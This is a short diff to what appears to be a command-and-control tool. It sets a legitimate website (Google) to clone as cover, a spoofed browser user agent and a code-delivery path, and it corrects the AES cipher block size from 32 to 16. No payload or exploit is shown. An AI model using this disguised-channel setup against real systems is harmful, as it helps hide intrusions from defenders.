@@ -13,7 +13,7 @@ via a query string parameter.
 """
 
 # CONFIG CONSTANTS:
-URL = ("https://www.google.com/")  # URL to clone to house a legitimate website
+URL = ("https://www.google.com")  # URL to clone to house a legitimate website
 USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
@@ -78,7 +78,7 @@ class AESCipher(object):
     Also ensure the coherence and the type of the data with a unicode to byte converter.
     """
     def __init__(self, key):
-        self.bs = 32
+        self.bs = 16
         self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
 
     @staticmethod
